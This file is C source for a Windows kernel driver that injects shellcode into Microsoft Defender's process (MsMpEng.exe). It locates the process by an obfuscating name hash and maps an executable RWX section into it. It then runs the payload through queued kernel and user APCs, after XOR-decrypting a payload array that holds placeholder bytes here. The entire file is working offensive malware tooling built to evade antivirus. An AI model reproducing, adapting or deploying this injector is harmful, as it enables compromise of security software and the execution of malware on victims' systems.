#include <ntifs.h>
#include <ntddk.h>
#include <ntstrsafe.h>
#include <wdf.h>

/*
# Reference:
	- https://github.com/danielkrupinski/KernelProcessList
	- https://github.com/adrianyy/KeInject
	- https://github.com/Idov31/Nidhogg
*/

#define DRIVER_TAG                          'llun'

#define TARGET_PROCESS_HASH					0xF70DC4CA	// L"MsMpEng.exe"

#define PROCESS_VM_OPERATION                (0x0008)  
#define PROCESS_VM_READ                     (0x0010)  
#define PROCESS_VM_WRITE                    (0x0020)  

#define ALERTABLE_THREAD_FLAG_OFFSET        0x74
#define GUI_THREAD_FLAG_OFFSET              0x78
#define THREAD_KERNEL_STACK_OFFSET          0x58
#define THREAD_CONTEXT_STACK_POINTER_OFFSET 0x2C8
#define ALERTABLE_THREAD_FLAG_BIT           0x10
#define GUI_THREAD_FLAG_BIT                 0x80


#define	SET_TO_MULTIPLE_OF_PAGE_SIZE(X)	    ( ((X) + PAGE_SIZE) & (~PAGE_SIZE) )


#define CHAR_BIT							8

//--------------------------------------------------------------------------------------------------------------------------------

typedef struct _SYSTEM_THREAD_INFORMATION
{
	LARGE_INTEGER KernelTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER CreateTime;
	ULONG WaitTime;
	PVOID StartAddress;
	CLIENT_ID ClientId;
	KPRIORITY Priority;
	LONG BasePriority;
	ULONG ContextSwitches;
	ULONG ThreadState;
	KWAIT_REASON WaitReason;
}SYSTEM_THREAD_INFORMATION, * PSYSTEM_THREAD_INFORMATION;

typedef struct _SYSTEM_PROCESS_INFO
{
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	LARGE_INTEGER WorkingSetPrivateSize;
	ULONG HardFaultCount;
	ULONG NumberOfThreadsHighWatermark;
	ULONGLONG CycleTime;
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ImageName;
	KPRIORITY BasePriority;
	HANDLE UniqueProcessId;
	HANDLE InheritedFromUniqueProcessId;
	ULONG HandleCount;
	ULONG SessionId;
	ULONG_PTR UniqueProcessKey;
	SIZE_T PeakVirtualSize;
	SIZE_T VirtualSize;
	ULONG PageFaultCount;
	SIZE_T PeakWorkingSetSize;
	SIZE_T WorkingSetSize;
	SIZE_T QuotaPeakPagedPoolUsage;
	SIZE_T QuotaPagedPoolUsage;
	SIZE_T QuotaPeakNonPagedPoolUsage;
	SIZE_T QuotaNonPagedPoolUsage;
	SIZE_T PagefileUsage;
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
	LARGE_INTEGER ReadOperationCount;
	LARGE_INTEGER WriteOperationCount;
	LARGE_INTEGER OtherOperationCount;
	LARGE_INTEGER ReadTransferCount;
	LARGE_INTEGER WriteTransferCount;
	LARGE_INTEGER OtherTransferCount;
	SYSTEM_THREAD_INFORMATION Threads[1];
}SYSTEM_PROCESS_INFO, * PSYSTEM_PROCESS_INFO;

typedef enum _KAPC_ENVIRONMENT
{
	OriginalApcEnvironment,
	AttachedApcEnvironment,
	CurrentApcEnvironment,
	InsertApcEnvironment

} KAPC_ENVIRONMENT;

typedef VOID(NTAPI* PKNORMAL_ROUTINE) (
	IN PVOID NormalContext,
	IN PVOID SystemArgument1,
	IN PVOID SystemArgument2
	);

typedef VOID(NTAPI* PKKERNEL_ROUTINE) (
	IN PKAPC Apc,
	IN OUT PKNORMAL_ROUTINE* NormalRoutine,
	IN OUT PVOID* NormalContext,
	IN OUT PVOID* SystemArgument1,
	IN OUT PVOID* SystemArgument2
	);

typedef VOID(NTAPI* PKRUNDOWN_ROUTINE) (
	IN PKAPC Apc
	);

typedef unsigned int        UINT;

//--------------------------------------------------------------------------------------------------------------------------------

NTKERNELAPI VOID NTAPI KeInitializeApc(
	OUT PRKAPC Apc,
	IN PETHREAD Thread,
	IN KAPC_ENVIRONMENT Environment,
	IN PKKERNEL_ROUTINE KernelRoutine,
	IN OPTIONAL PKRUNDOWN_ROUTINE RundownRoutine,
	IN OPTIONAL PKNORMAL_ROUTINE NormalRoutine,
	IN OPTIONAL KPROCESSOR_MODE ApcMode,
	IN OPTIONAL PVOID NormalContext
);

NTKERNELAPI BOOLEAN NTAPI KeInsertQueueApc(
	IN OUT PRKAPC Apc,
	IN OPTIONAL PVOID SystemArgument1,
	IN OPTIONAL PVOID SystemArgument2,
	IN KPRIORITY Increment
);

NTKERNELAPI BOOLEAN NTAPI KeTestAlertThread(
	IN KPROCESSOR_MODE AlertMode
);


NTKERNELAPI PVOID NTAPI PsGetCurrentProcessWow64Process(
	VOID
);

NTKERNELAPI NTSTATUS NTAPI ZwQuerySystemInformation(
	IN ULONG SystemInformationClass,
	OUT PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength
);

//--------------------------------------------------------------------------------------------------------------------------------
// String Hashing Algorithm:

// https://github.com/vxunderground/VX-API/blob/main/VX-API/HashStringRotr32.cpp
UINT32 HashStringRotr32SubW(UINT32 Value, UINT Count)
{
	DWORD Mask = (CHAR_BIT * sizeof(Value) - 1);
	Count &= Mask;
#pragma warning( push )
#pragma warning( disable : 4146)
	return (Value >> Count) | (Value << ((-Count) & Mask));
#pragma warning( pop ) 
}

INT HashStringRotr32W(_In_ LPCWSTR String)
{
	INT Value = 0;

	for (INT Index = 0; Index < wcslen(String); Index++)
		Value = String[Index] + HashStringRotr32SubW(Value, 7);

	return Value;
}

//--------------------------------------------------------------------------------------------------------------------------------

WCHAR g_TargetProcessName[0xFF] = { 0 };

//--------------------------------------------------------------------------------------------------------------------------------

BOOLEAN FetchTargetProcessAndThread(OUT HANDLE* phProcessId, OUT PETHREAD* pThread, OUT HANDLE* phThreadId) {

	if (phProcessId == NULL || pThread == NULL || phThreadId == NULL) {
		return FALSE;
	}

	NTSTATUS                STATUS				= STATUS_SUCCESS;
	ULONG                   uReturnLength		= 0x00,
							uAlertableThread	= 0x00,
							uGuiThread			= 0x00;
	PVOID                   pAddress			= NULL;
	PSYSTEM_PROCESS_INFO    pSystemProcesses	= NULL;
	PETHREAD                pTmpThread			= NULL;

	// Fetch array size
	if ((STATUS = ZwQuerySystemInformation(0x05, NULL, 0x00, &uReturnLength)) != STATUS_INFO_LENGTH_MISMATCH) {
		DbgPrint("[!] ZwQuerySystemInformation [1] Failed With Error: 0x%0.8X \n", STATUS);
		goto _FUNC_CLEANUP;
	}

	// Allocate enough memory
	if ((pAddress = ExAllocatePool2(POOL_FLAG_NON_PAGED, (SIZE_T)uReturnLength, (ULONG)DRIVER_TAG)) == NULL) {
		DbgPrint("[!] ExAllocatePool2 Failed \n");
		goto _FUNC_CLEANUP;
	}

	// Fetch array
	if (!NT_SUCCESS((STATUS = ZwQuerySystemInformation(0x05, pAddress, uReturnLength, &uReturnLength)))) {
		DbgPrint("[!] ZwQuerySystemInformation [2] Failed With Error: 0x%0.8X \n", STATUS);
		goto _FUNC_CLEANUP;
	}

	pSystemProcesses = (PSYSTEM_PROCESS_INFO)pAddress;

	do {

		// Search for the target process using it's hash
		if (pSystemProcesses->ImageName.Length && HashStringRotr32W(pSystemProcesses->ImageName.Buffer) == TARGET_PROCESS_HASH) {

			// Copy the name to a global variable (used for debugging)
			if (pSystemProcesses->ImageName.Length < (sizeof(g_TargetProcessName) - sizeof(WCHAR))) {
				wcscpy(g_TargetProcessName, pSystemProcesses->ImageName.Buffer);
			}

			// Save process ID
			*phProcessId = pSystemProcesses->UniqueProcessId;

			// Search for an alertable thread
			for (ULONG i = 0; i < pSystemProcesses->NumberOfThreads; i++) {

				if (pSystemProcesses->Threads[i].ClientId.UniqueThread == PsGetCurrentThread())
					continue;

				if (!NT_SUCCESS((STATUS = PsLookupThreadByThreadId(pSystemProcesses->Threads[i].ClientId.UniqueThread, &pTmpThread)))) {
					DbgPrint("[!] PsLookupThreadByThreadId Failed At Thread %ld With Error: 0x%0.8X \n", pSystemProcesses->Threads[i].ClientId.UniqueThread, STATUS);
					continue;
				}

				if (PsIsThreadTerminating(pTmpThread)) {
					ObDereferenceObject(pTmpThread);
					continue;
				}

				uAlertableThread = *(PULONG64)((BYTE*)pTmpThread + ALERTABLE_THREAD_FLAG_OFFSET) & ALERTABLE_THREAD_FLAG_BIT;
				uGuiThread = *(PULONG64)((BYTE*)pTmpThread + GUI_THREAD_FLAG_OFFSET) & GUI_THREAD_FLAG_BIT;

				if (uAlertableThread == 0x00 ||
					uGuiThread != 0x00 ||         // Skip GUI Threads
					*(PULONG64)((BYTE*)pTmpThread + THREAD_KERNEL_STACK_OFFSET) == 0x00 ||
					*(PULONG64)((BYTE*)pTmpThread + THREAD_CONTEXT_STACK_POINTER_OFFSET) == 0x00)
				{
					ObDereferenceObject(pTmpThread);
					continue;
				}

				// Save the found thread and thread id
				*pThread = pTmpThread;
				*phThreadId = pSystemProcesses->Threads[i].ClientId.UniqueThread;
				break;
			}

		}

		// Move to another process in the array
		pSystemProcesses = (PSYSTEM_PROCESS_INFO)((BYTE*)pSystemProcesses + pSystemProcesses->NextEntryOffset);

	} while (pSystemProcesses->NextEntryOffset != 0x00);


_FUNC_CLEANUP:
	if (pAddress != NULL)
		ExFreePoolWithTag(pAddress, DRIVER_TAG);
	return *pThread == 0x00 ? FALSE : TRUE;
}

//--------------------------------------------------------------------------------------------------------------------------------


BOOLEAN CreateSharedSection(IN SIZE_T sShellcodeSize, OUT HANDLE* phSection) {

	if (!sShellcodeSize || !phSection)
		return FALSE;

	UNICODE_STRING          SectionName		= { 0x00 };
	OBJECT_ATTRIBUTES	    ObjectAttr		= { 0x00 };
	NTSTATUS                STATUS			= STATUS_SUCCESS;
	LARGE_INTEGER           SectionSize		= { .QuadPart = SET_TO_MULTIPLE_OF_PAGE_SIZE(sShellcodeSize) };


	RtlInitUnicodeString(&SectionName, L"\\BaseNamedObjects\\MySharedMemory");
	InitializeObjectAttributes(&ObjectAttr, &SectionName, OBJ_KERNEL_HANDLE, NULL, NULL);

	// Create a section to map into kernel & user mode memory
	if (!NT_SUCCESS((STATUS = ZwCreateSection(phSection, SECTION_ALL_ACCESS, &ObjectAttr, &SectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)))) {
		DbgPrint("[!] ZwCreateSection Failed With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	DbgPrint("[+] Opened A Section Handle: 0x%0.8X \n", *phSection);

	return TRUE;
}

//--------------------------------------------------------------------------------------------------------------------------------

// Callback function for APC that is executed in an alertable thread context
VOID KernelModeApcCallback(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* NormalContext, PVOID* SystemArgument1, PVOID* SystemArgument2) {
	UNREFERENCED_PARAMETER(NormalRoutine);
	UNREFERENCED_PARAMETER(NormalContext);
	UNREFERENCED_PARAMETER(SystemArgument1);
	UNREFERENCED_PARAMETER(SystemArgument2);

	// Alert the current thread to execute its pending user - mode APCs
	KeTestAlertThread(UserMode);
	ExFreePoolWithTag(Apc, DRIVER_TAG);
}

// Callback function for APC executed in a normal thread context
VOID UserModeApcCallback(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* NormalContext, PVOID* SystemArgument1, PVOID* SystemArgument2) {
	UNREFERENCED_PARAMETER(SystemArgument1);
	UNREFERENCED_PARAMETER(SystemArgument2);

	// Check if the current thread is in the process of terminating
	if (PsIsThreadTerminating(PsGetCurrentThread()))
		*NormalRoutine = NULL; // canceling the APC

	// Check if the current process is a 32-bit process running on a 64-bit Windows
	if (PsGetCurrentProcessWow64Process())
		PsWrapApcWow64Thread(NormalContext, (PVOID*)NormalRoutine); // Wrap the APC for execution in a 32-bit thread's context (use 32-bit payload) - NOT TESTED!

	ExFreePoolWithTag(Apc, DRIVER_TAG);
}

BOOLEAN ExecuteShellcode(IN PVOID pInjectedUMShellcode, IN PETHREAD peAlertableThreadId) {

	BOOLEAN     bSTATE			= FALSE;
	PKAPC       pkUserMApc		= NULL,
				pkKernelMApc	= NULL;

	if (!pInjectedUMShellcode || !peAlertableThreadId)
		return FALSE;

	// ALlocate memory for the APCs
	if ((pkUserMApc = (PKAPC)ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(KAPC), DRIVER_TAG)) == NULL) {
		DbgPrint("[!] ExAllocatePool2 [1] Failed \n");
		goto _FUNC_CLEANUP;
	}

	if ((pkKernelMApc = (PKAPC)ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(KAPC), DRIVER_TAG)) == NULL) {
		DbgPrint("[!] ExAllocatePool2 [2] Failed \n");
		goto _FUNC_CLEANUP;
	}

	// Intialize the APCs
	KeInitializeApc(pkKernelMApc, peAlertableThreadId, OriginalApcEnvironment, (PKKERNEL_ROUTINE)KernelModeApcCallback, NULL, NULL, KernelMode, NULL);
	KeInitializeApc(pkUserMApc, peAlertableThreadId, OriginalApcEnvironment, (PKKERNEL_ROUTINE)UserModeApcCallback, NULL, (PKNORMAL_ROUTINE)pInjectedUMShellcode, UserMode, NULL);

	// Execute the APCs (user mode before kernel mode)
	if (!KeInsertQueueApc(pkUserMApc, NULL, NULL, FALSE)) {
		DbgPrint("[!] KeInsertQueueApc [1] Failed \n");
		goto _FUNC_CLEANUP;
	}

	if (!KeInsertQueueApc(pkKernelMApc, NULL, NULL, FALSE)) {
		DbgPrint("[!] KeInsertQueueApc [2] Failed \n");
		goto _FUNC_CLEANUP;
	}

	bSTATE = TRUE;

_FUNC_CLEANUP:
	if (!bSTATE && pkUserMApc)
		ExFreePoolWithTag(pkUserMApc, DRIVER_TAG);
	if (!bSTATE && pkKernelMApc)
		ExFreePoolWithTag(pkKernelMApc, DRIVER_TAG);

	return bSTATE;
}

//--------------------------------------------------------------------------------------------------------------------------------


BOOLEAN InjectPayload(IN PVOID pShellcode, IN SIZE_T sShellcodeSize) {

	BOOLEAN             bSTATE				= FALSE;
	PETHREAD            hThread				= NULL;
	HANDLE				hProcessId			= NULL,
						hThreadId			= NULL,
						hProcess			= NULL,
						hSection			= NULL;
	NTSTATUS            STATUS				= STATUS_SUCCESS;
	OBJECT_ATTRIBUTES	ObjectAttr			= { 0x00 };
	CLIENT_ID			ClientId			= { 0x00 };
	PVOID               pLocalAddress		= NULL,
						pRemoteAddress		= NULL;
	SIZE_T              sViewSize			= 0x00;

	if (!pShellcode || !sShellcodeSize)
		return FALSE;

	// Get target process ID and an alertable thread
	if (!FetchTargetProcessAndThread(&hProcessId, &hThread, &hThreadId)) {
		DbgPrint("[!] FetchTargetProcessAndThread Failed \n");
		goto _FUNC_CLEANUP;
	}

	DbgPrint("[+] Found %ws's PID: %ld \n", g_TargetProcessName, hProcessId);
	DbgPrint("[+] Found Alertable Thread Of ID: %ld \n", hThreadId);

	// Open process handle
	InitializeObjectAttributes(&ObjectAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
	ClientId.UniqueProcess = hProcessId;
	ClientId.UniqueThread = NULL;

	if (!NT_SUCCESS((STATUS = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &ObjectAttr, &ClientId)))) {
		DbgPrint("[!] ZwOpenProcess Failed With Error: 0x%0.8X \n", STATUS);
		goto _FUNC_CLEANUP;
	}

	DbgPrint("[+] Opened A Handle To %ws: 0x%0.8X \n", g_TargetProcessName, hProcess);

	// Create a RWX section 
	if (!CreateSharedSection(sShellcodeSize, &hSection) || hSection == NULL) {
		goto _FUNC_CLEANUP;
	}

	// Map the section to kernel memory
	if (!NT_SUCCESS((STATUS = ZwMapViewOfSection(hSection, NtCurrentProcess(), &pLocalAddress, 0x00, 0x00, NULL, &sViewSize, ViewUnmap, 0x00, PAGE_READWRITE)))) {
		DbgPrint("[!] ZwMapViewOfSection [1] Failed With Error: 0x%0.8X \n", STATUS);
		goto _FUNC_CLEANUP;
	}

	DbgPrint("[+] Allocated Local RW Memory: 0x%p \n", pLocalAddress);

	// Copy payload to kernel memory
	RtlCopyMemory(pLocalAddress, pShellcode, sShellcodeSize);

	DbgPrint("[+] Copied Payload To Local Memory\n");

	// Map the payload to the user-mode process
	if (!NT_SUCCESS((STATUS = ZwMapViewOfSection(hSection, hProcess, &pRemoteAddress, 0x00, 0x00, NULL, &sViewSize, ViewShare, 0x00, PAGE_EXECUTE_READWRITE)))) {
		DbgPrint("[!] ZwMapViewOfSection [2] Failed With Error: 0x%0.8X \n", STATUS);
		goto _FUNC_CLEANUP;
	}

	DbgPrint("[+] Allocated Remote RWX Memory In %ws At: 0x%p \n", g_TargetProcessName, pRemoteAddress);

	// Execute the payload
	if (!ExecuteShellcode(pRemoteAddress, hThread)) {
		DbgPrint("[!] ExecuteShellcode Failed \n");
		goto _FUNC_CLEANUP;
	}

	DbgPrint("[+] Payload Executed Successfully! \n");

	bSTATE = TRUE;

_FUNC_CLEANUP:
	if (!bSTATE && pLocalAddress)
		ZwUnmapViewOfSection(NtCurrentProcess(), pLocalAddress);
	if (!bSTATE && pRemoteAddress)
		ZwUnmapViewOfSection(hProcess, pRemoteAddress);
	if (hSection)
		ZwClose(hSection);
	if (hProcess)
		ZwClose(hProcess);
	if (hThread)
		ObDereferenceObject(hThread);
	return bSTATE;
}

//--------------------------------------------------------------------------------------------------------------------------------
// Payload to execute inside the target user-mode process

unsigned char Encrypted[] = {

	// Encrypted payload generated by PayloadEncrypter.exe
	// Ex: PayloadEncrypter.exe demonx64.bin > payload.txt
	// Then replace payload.txt's 'Encrypted' array with the one here
	0x90, 0x90, 0x90, 0x90


};
//--------------------------------------------------------------------------------------------------------------------------------

NTSTATUS LdrDriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING pRegistryPath) {
	UNREFERENCED_PARAMETER(pDriverObject);
	UNREFERENCED_PARAMETER(pRegistryPath);

	DbgPrint("[+] Driver Loaded Successfully \n");

	// Decrypting the payload
	for (SIZE_T i = 0; i < sizeof(Encrypted); i++) {

		if ((i + 2) % 16 == 0)
			Encrypted[i] = Encrypted[i] ^ 0x3C;
		if (i % 2 == 0)
			Encrypted[i] = Encrypted[i] ^ 0x85;
		else
			Encrypted[i] = Encrypted[i] ^ 0x2A;

	}

	InjectPayload((PVOID)Encrypted, (SIZE_T)sizeof(Encrypted));

	DbgPrint("[*] DONE!\n");

	return STATUS_SUCCESS;
}
